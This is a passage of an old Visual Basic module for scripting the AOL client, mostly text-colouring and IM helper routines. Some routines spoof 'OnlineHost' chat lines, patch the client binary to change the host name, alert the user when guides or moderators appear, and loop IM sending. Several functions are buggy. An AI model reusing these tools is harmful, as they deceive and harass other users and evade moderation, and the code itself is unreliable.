            If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
            If c <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + C1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + C2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + C3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + C4 + ">"
            End If
            If o2 = 1 Then Msg = Msg + "<sub>"
            If o2 = 3 Then Msg = Msg + "<sup>"
          Msg = Msg + Mid$(messg, X, 1)
          If o2 = 1 Then Msg = Msg + "</sub>"
          If o2 = 3 Then Msg = Msg + "</sup>"
          If Q2 = 2 Then
            Q = 1
            Q2 = 1
      If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + C1 + ">"
      If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + C2 + ">"
      If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + C3 + ">"
      If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + C4 + ">"
   End If
nc: Next X
C1 = C1BAK
C2 = C2BAK
C3 = C3BAK
C4 = C4BAK
Style = Msg
End Function

Function BackandWavy(messg)
   C1BAK = C1
   C2BAK = C2
   C3BAK = C3
   C4BAK = C4
   c = 0
   O = 0
   o2 = 0
   Q = 1
   Q2 = 1
   For X = 1 To Len(messg)
            BVAL1 = Form20.text1b - Form20.Text1a
            BVAL2 = Form20.text2b - Form20.text2a
            BVAL3 = Form20.text3b - Form20.text3a
            val1 = (BVAL1 / Len(messg) * X) + Form20.Text1a
            val2 = (BVAL2 / Len(messg) * X) + Form20.text2a
            VAL3 = (BVAL3 / Len(messg) * X) + Form20.text3a
            C1 = RGB2HEX(val1, val2, VAL3)
            C2 = RGB2HEX(val1, val2, VAL3)
            C3 = RGB2HEX(val1, val2, VAL3)
            C4 = RGB2HEX(val1, val2, VAL3)
            If C1 = C2 And C2 = C3 And C3 = C4 And C4 = C1 Then c = 1: Msg = Msg & "<FONT BACK=#" + C1 + ">"
            If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
            If c <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT BACK=#" + C1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT BACK=#" + C2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT BACK=#" + C3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT BACK=#" + C4 + ">"
            End If
            If o2 = 1 Then Msg = Msg + "<sub>"
            If o2 = 3 Then Msg = Msg + "<sup>"
          Msg = Msg + Mid$(messg, X, 1)
          If o2 = 1 Then Msg = Msg + "</sub>"
          If o2 = 3 Then Msg = Msg + "</sup>"
          If Q2 = 2 Then
            Q = 1
            Q2 = 1
      If o2 = 1 Then Msg = Msg + "<FONT BACK=#" + C1 + ">"
      If o2 = 2 Then Msg = Msg + "<FONT BACK=#" + C2 + ">"
      If o2 = 3 Then Msg = Msg + "<FONT BACK=#" + C3 + ">"
      If o2 = 4 Then Msg = Msg + "<FONT BACK=#" + C4 + ">"
   End If
nc: Next X
C1 = C1BAK
C2 = C2BAK
C3 = C3BAK
C4 = C4BAK
BackandWavy = Msg
End Function
Function Back(messg)
   C1BAK = C1
   C2BAK = C2
   C3BAK = C3
   C4BAK = C4
   c = 0
   O = 0
   o2 = 0
   Q = 1
   Q2 = 1
   For X = 1 To Len(messg)
            BVAL1 = Form20.text1b - Form20.Text1a
            BVAL2 = Form20.text2b - Form20.text2a
            BVAL3 = Form20.text3b - Form20.text3a
            val1 = (BVAL1 / Len(messg) * X) + Form20.Text1a
            val2 = (BVAL2 / Len(messg) * X) + Form20.text2a
            VAL3 = (BVAL3 / Len(messg) * X) + Form20.text3a
            C1 = RGB2HEX(val1, val2, VAL3)
            C2 = RGB2HEX(val1, val2, VAL3)
            C3 = RGB2HEX(val1, val2, VAL3)
            C4 = RGB2HEX(val1, val2, VAL3)
            If C1 = C2 And C2 = C3 And C3 = C4 And C4 = C1 Then c = 1: Msg = Msg & "<FONT BACK=#" + C1 + ">"
            If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
            If c <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT BACK=#" + C1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT BACK=#" + C2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT BACK=#" + C3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT BACK=#" + C4 + ">"
            End If
            If o2 = 1 Then Msg = Msg + ""
            If o2 = 3 Then Msg = Msg + ""
          Msg = Msg + Mid$(messg, X, 1)
          If o2 = 1 Then Msg = Msg + ""
          If o2 = 3 Then Msg = Msg + ""
          If Q2 = 2 Then
            Q = 1
            Q2 = 1
      If o2 = 1 Then Msg = Msg + "<FONT BACK=#" + C1 + ">"
      If o2 = 2 Then Msg = Msg + "<FONT BACK=#" + C2 + ">"
      If o2 = 3 Then Msg = Msg + "<FONT BACK=#" + C3 + ">"
      If o2 = 4 Then Msg = Msg + "<FONT BACK=#" + C4 + ">"
   End If
nc: Next X
C1 = C1BAK
C2 = C2BAK
C3 = C3BAK
C4 = C4BAK
Back = Msg
End Function

Function Wavy(messg)
   C1BAK = C1
   C2BAK = C2
   C3BAK = C3
   C4BAK = C4
   c = 0
   O = 0
   o2 = 0
   Q = 1
   Q2 = 1
   For X = 1 To Len(messg)
            BVAL1 = Form20.text1b - Form20.Text1a
            BVAL2 = Form20.text2b - Form20.text2a
            BVAL3 = Form20.text3b - Form20.text3a
            val1 = (BVAL1 / Len(messg) * X) + Form20.Text1a
            val2 = (BVAL2 / Len(messg) * X) + Form20.text2a
            VAL3 = (BVAL3 / Len(messg) * X) + Form20.text3a
            C1 = RGB2HEX(val1, val2, VAL3)
            C2 = RGB2HEX(val1, val2, VAL3)
            C3 = RGB2HEX(val1, val2, VAL3)
            C4 = RGB2HEX(val1, val2, VAL3)
            If C1 = C2 And C2 = C3 And C3 = C4 And C4 = C1 Then c = 1: Msg = Msg & "<FONT BACK=#" + C1 + ">"
            If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
            If c <> 1 Then
            If o2 = 1 Then Msg = Msg + ""
            If o2 = 2 Then Msg = Msg + ""
            If o2 = 3 Then Msg = Msg + ""
            If o2 = 4 Then Msg = Msg + ""
            End If
            If o2 = 1 Then Msg = Msg + "<sub>"
            If o2 = 3 Then Msg = Msg + "<sup>"
          Msg = Msg + Mid$(messg, X, 1)
          If o2 = 1 Then Msg = Msg + "<sub>"
          If o2 = 3 Then Msg = Msg + "</sup>"
          If Q2 = 2 Then
            Q = 1
            Q2 = 1
      If o2 = 1 Then Msg = Msg + ""
      If o2 = 2 Then Msg = Msg + ""
      If o2 = 3 Then Msg = Msg + ""
      If o2 = 4 Then Msg = Msg + ""
   End If
nc: Next X
C1 = C1BAK
C2 = C2BAK
C3 = C3BAK
C4 = C4BAK
Wavy = Msg
End Function



Function Text_Rainbow(strin2 As String)
Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
Dad = "#"

Do While numspc2% <= lenth2%

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "1d1a62" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "182a71" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "094a91" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "106cac" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "0d84c4" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "106cac" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "094a91" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "1d1a62" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "182a71" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "000000" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$

Loop
talk_rainbow = newsent2$

End Function

Function Trim_Null(wstr As String)
'Trims null characters from a string
wstr = Trim(wstr)
Do Until XX = Len(wstr)
Let XX = XX + 1
Let this_chr = Asc(Mid$(wstr, XX, 1))
If this_chr > 31 And this_chr <> 256 Then Let wordd = wordd & Mid$(wstr, XX, 1)
Loop
Trim_Null = wordd
End Function

Function TrimNull(wstr As String)
'Trims null characters from a string
wstr = Trim(wstr)
Do Until XX = Len(wstr)
Let XX = XX + 1
Let this_chr = Asc(Mid$(wstr, XX, 1))
If this_chr > 31 And this_chr <> 256 Then Let wordd = wordd & Mid$(wstr, XX, 1)
Loop
TrimNull = wordd
End Function

Function RGB2HEX(R, G, B)
Dim X%
Dim XX%
Dim Color%
Dim Divide
Dim Answer%
Dim Remainder%
Dim Configuring$
For X% = 1 To 3
If X% = 1 Then Color% = B
If X% = 2 Then Color% = G
If X% = 3 Then Color% = R
For XX% = 1 To 2
Divide = Color% / 16
Answer% = Int(Divide)
Remainder% = (10000 * (Divide - Answer%)) / 625

If Remainder% < 10 Then Configuring$ = Str(Remainder%) + Configuring$
If Remainder% = 10 Then Configuring$ = "A" + Configuring$
If Remainder% = 11 Then Configuring$ = "B" + Configuring$
If Remainder% = 12 Then Configuring$ = "C" + Configuring$
If Remainder% = 13 Then Configuring$ = "D" + Configuring$
If Remainder% = 14 Then Configuring$ = "E" + Configuring$
If Remainder% = 15 Then Configuring$ = "F" + Configuring$
Color% = Answer%
Next XX%
Next X%
Configuring$ = RemoveSpace(Configuring$)
RGB2HEX = Configuring$
End Function

Sub AOLAntiIdle()
aol% = findwindow("_AOL_Modal", vbNullString)
xstuff% = FindChildByTitle(aol%, "Favorite Places")
If xstuff% Then Exit Sub
xstuff2% = FindChildByTitle(aol%, "File Transfer *")
If xstuff2% Then Exit Sub
yes% = FindChildByClass(aol%, "_AOL_Button")
AOLButton yes%
End Sub

Sub AOLGetMemberProfile(name As String)
AOLRunMenuByString ("Get a Member's Profile")
Pause 0.3
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
prof% = FindChildByTitle(mdi%, "Get a Member's Profile")
putname% = FindChildByClass(prof%, "_AOL_Edit")
Call AOLSetText(putname%, name)
okbutton% = FindChildByClass(prof%, "_AOL_Button")
AOLButton okbutton%
End Sub


Function FindIMTextwindow()
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
FindIMTextwindow = FindChildByClass(im%, "RICHCNTL")
End Function
Function FindIMCaption()
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
FindIMCaption = FindChildByClass(im%, "_AOL_Static")
End Function
Function AOLChangeIMCaption(txt As String)
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
imtext% = FindChildByClass(im%, "_AOL_Static")
Call ChangeCaption(imtext%, txt)
End Function


Function MakeSpaceInGoto(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If NextChr$ = " " Then Let NextChr$ = "%20"
Let Newsent$ = Newsent$ + NextChr$
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
MakeSpaceInGoto = Newsent$
End Function

Sub AOLAntiPunt2()
Do
ANT% = FindChildByTitle(AOLMDI(), "Untitled")
IMRICH% = FindChildByClass(ANT%, "RICHCNTL")
STS% = FindChildByClass(ANT%, "_AOL_Static")
st% = getwindow(STS%, GW_HWNDNEXT)
st% = getwindow(st%, GW_HWNDNEXT)
Call AOLSetText(st%, "FÆ Cyclone - This IM Window Should Remain OPEN.")
mi = showwindow(ANT%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = sendmessagebynum(IMRICH%, WM_Close, 0, 0)
Lab = sendmessagebynum(IMRICH%, WM_Close, 0, 0)
End If
Loop
End Sub
Sub AOLCatWatch()
Do
    Y% = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo LOL
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
w = InStr(LCase$(namez$), LCase$("catwatch"))
X = InStr(LCase$(namez$), LCase$("catid"))
If w <> 0 Then
Call AOLKeyword("PC")
MsgBox "A Cat had entered the room."
End If
If X <> 0 Then
Call AOLKeyword("PC")
MsgBox "A Cat had entered the room."
End If
Next Index%
LOL:
Loop
End Sub
Public Sub AOLChangeWelcome(newwelcome As String)
Welc% = FindChildByTitle(AOLMDI(), "Welcome, " & AOLGetUser & "!")
Call AOLSetText(Welc%, newwelcome)
End Sub
Public Sub AOLChatManipulator(Who$, what$)
view% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "" & (Who$) & ":" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub AOLClearChatRoom()
'clears the chat room
X$ = Format$(String$(100, Chr$(13)))
Call AOLChatManipulator(" ", X$)
a = String(116, Chr(32))
D = 116 - Len(txt)
c$ = Left(a, D)
'AOLChatSend "" + txt.text + "" & c$ & "" + txt.text + ""
'pause 0.3
'AOLChatSend "" + txt.text + "" & c$ & "" + txt.text + ""
'pause 0.3
'AOLChatSend "" + txt.text + "" & c$ & "" + txt.text + ""
'pause 0.3
'AOLChatSend "" + txt.text + "" & c$ & "" + txt.text + ""
'pause 0.7
End Sub

Sub AOLGuideWatch()
Do
    Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call AOLKeyword("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub
Sub AOLHostManipulator(what$)
'AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
view% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "OnlineHost:" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub AOLHostNameChange(SN As String)
X = AOLVersion()
If X = "C:\aol30" Then
Open "C:\aol30\tool\aolchat.aol" For Binary As #1
Seek #1, 6887
Put #1, , SN

Close #1
ElseIf X = "C:\aol25" Then
Open "C:\aol25\tool\chat.aol" For Binary As #1
Seek #1, 6887
Put #1, , SN

Close #1
End If
End Sub
Function AOLFindChatWindow() As Integer
  Dim genhWnd%
  Dim AOLChildhWnd%
  Dim ChildWnd As Integer
  Dim ControlWnd As Integer
  Dim ChatWnd As Integer
  Dim TargetsFound As Integer
  Dim RetClsName As String * 255
  Dim X%
genhWnd% = getwindow(findwindow("AOL Frame25", 0&), GW_CHILD)
Do
  X% = GetClassName(genhWnd%, RetClsName$, 254)
    If InStr(RetClsName$, "MDIClient") Then
      AOLChildhWnd% = genhWnd% 'Child window found!
    End If
  genhWnd% = getwindow(genhWnd%, GW_HWNDNEXT)
  DoEvents
Loop While genhWnd% <> 0
ChildWnd = getwindow(AOLChildhWnd%, GW_CHILD)
Do
  ControlWnd = getwindow(ChildWnd, GW_CHILD)
  Do
    X% = GetClassName(ControlWnd, RetClsName$, 254)

    
    If InStr(RetClsName$, "_AOL_Edit") Then
      TargetsFound = TargetsFound + 1
    ElseIf InStr(RetClsName$, "_AOL_View") Then
      TargetsFound = TargetsFound + 1
    ElseIf InStr(RetClsName$, "_AOL_Listbox") Then
      TargetsFound = TargetsFound + 1:
    End If
    ControlWnd = getwindow(ControlWnd, GW_HWNDNEXT)
    DoEvents
  Loop While ControlWnd <> 0

  If TargetsFound = 3 Then ChatWnd = ChildWnd: Exit Do

  
  ChildWnd = getwindow(ChildWnd, GW_HWNDNEXT)
Loop While ChildWnd <> 0
Chat_FindTheWin = ChatWnd

End Function
Sub Click2(Button%)
SendNow% = sendmessagebynum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = sendmessagebynum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
Sub AOLlocateMember(name As String)
'locates, if possible, member "name"
AOLRunMenuByString ("Locate a Member Online")
Pause 0.3
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
prof% = FindChildByTitle(mdi%, "Locate Member Online")
putname% = FindChildByClass(prof%, "_AOL_Edit")
Call AOLSetText(putname%, name)
okbutton% = FindChildByClass(prof%, "_AOL_Button")
AOLButton okbutton%
closes = SendMessage(prof%, WM_Close, 0, 0)
End Sub
Function MessageFromIM()
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
imtext% = FindChildByClass(im%, "RICHCNTL")
IMmessage = AOLGetText(imtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(IMmessage, Len(IMmessage) - 1)
End Function

Sub SizeFormToWindow(frm As Form, win%)
Dim wndRect As Rect, lRet As Long
lRet = GetWindowRect(win%, wndRect)
With frm
  .Top = wndRect.Top * Screen.TwipsPerPixelY
  .Left = wndRect.Left * Screen.TwipsPerPixelX
  .Height = ((wndRect.Bottom) - (wndRect.Top)) * Screen.TwipsPerPixelY
  .Width = ((wndRect.Right) - (wndRect.Left)) * Screen.TwipsPerPixelX
End With
End Sub
Function SNfromIM()
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
heh$ = GetCaption(im%)
Naw$ = Mid(heh$, InStr(heh$, ":") + 2)
SNfromIM = Naw$
End Function
Function SNFromLastChatLine()
'Gets sn from from last chat line
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function
Sub SendChatUnderLine(UnderLineChat)
'It underlines chat text.
SendChat ("<u>" & UnderLineChat & "</u>")
End Sub

Sub Upchat()
'Allows you to upload and chat at same  time
aol% = findwindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call enablewindow(aol%, 1)
Call enablewindow(Upp%, 0)
End Sub

Sub UnUpchat()
aol% = findwindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call enablewindow(Upp%, 1)
Call enablewindow(aol%, 0)
End Sub


Function UserSN()
'Gets user SN
On Error Resume Next
aol% = findwindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = getwindowtext(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = User
End Function
Function AOLGetText(child)
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, trimspace$)

AOLGetText = trimspace$
End Function


Sub AOLIcon(icon%)
Clck2% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck2% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub


Sub AOLClick(icon%)
Clck2% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck2% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AOLInstantMessage5(Person, message)
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aoledit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And imsend% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, message)
imsend% = FindChildByClass(im%, "_AOL_Icon")
For sends = 1 To 9
imsend% = getwindow(imsend%, GW_HWNDNEXT)
Next sends
AOLIcon (imsend%)
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aolcl% = findwindow("#32770", "AOL Canada")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_Close, 0, 0): closer2 = SendMessage(im%, WM_Close, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
End Sub
Sub AOLInstantMessage(Person, message)
Call runmenubystring(AOLWindow(), "Send an Instant Message")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aoledit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And imsend% <> 0 Then Exit Do
Loop

Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, message)
imsend% = FindChildByClass(im%, "_AOL_Icon")

For sends = 1 To 9
imsend% = getwindow(imsend%, 2)
Next sends

AOLIcon (imsend%)

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aolcl% = findwindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_Close, 0, 0): closer2 = SendMessage(im%, WM_Close, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
End Sub


Sub AOLInstantMessage2(Person)
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, ">Instant Message From: ")
aoledit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
If aoledit% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
End Sub
Sub AOLInstantMessage3(Person, message)
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")
Call runmenubystring(AOLWindow(), "Send an Instant Message")

Do
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aoledit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And imsend% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, message)
imsend% = FindChildByClass(im%, "_AOL_Icon")
For sends = 1 To 9
imsend% = getwindow(imsend%, 2)
Next sends
AOLIcon (imsend%)
Loop Until im% = 0
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aolcl% = findwindow("#32770", "AOL Canada")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_Close, 0, 0): closer2 = SendMessage(im%, WM_Close, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop

End Sub
Sub AOLInstantMessage4(Person, message)
Call runmenubystring(AOLWindow(), "Send an Instant Message")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aoledit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And imsend% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, message)
imsend% = FindChildByClass(im%, "_AOL_Icon")
For sends = 1 To 9
imsend% = getwindow(imsend%, 2)
Next sends
AOLIcon (imsend%)
End Sub

Function AOLChildIM()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
imsend% = FindChildByClass(im%, "_AOL_Icon")
AOLChildIM = imsend%
End Function
Function AOLCreateIM(Person, message)
Call runmenubystring(AOLWindow(), "Send an Instant Message")

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aoledit% = FindChildByClass(im%, "_AOL_Edit")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And imsend% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, message)
SendKeys "{TAB}"
End Function
Function AOLIsOnline()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
If welcome% = 0 Then
AOLIsOnline = 0
Exit Function
End If
AOLIsOnline = 1
End Function
Function AOLIMScan()
aolcl% = findwindow("#32770", "AOL Canada")
If aolcl% > 0 Then
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aolcl% = findwindow("#32770", "AOL Canada")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_Close, 0, 0): closer2 = SendMessage(im%, WM_Close, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
GoTo IMsOFF
End If
If aolcl% = 0 Then
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aolcl% = findwindow("#32770", "AOL Canada")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_Close, 0, 0): closer2 = SendMessage(im%, WM_Close, 0, 0): Exit Do
If im% = 0 Then Exit Do
Loop
GoTo IMsOn
End If
IMsOFF:
Form6.Label1.Caption = "IMs OFF"
Form6.Label1.Caption = "His/Her IMs are OFF!"
Form6.Show
IMsOn:
End Function

Sub AOLKeyword(Text)
Call runmenubystring(AOLWindow(), "Keyword...")

Do: DoEvents
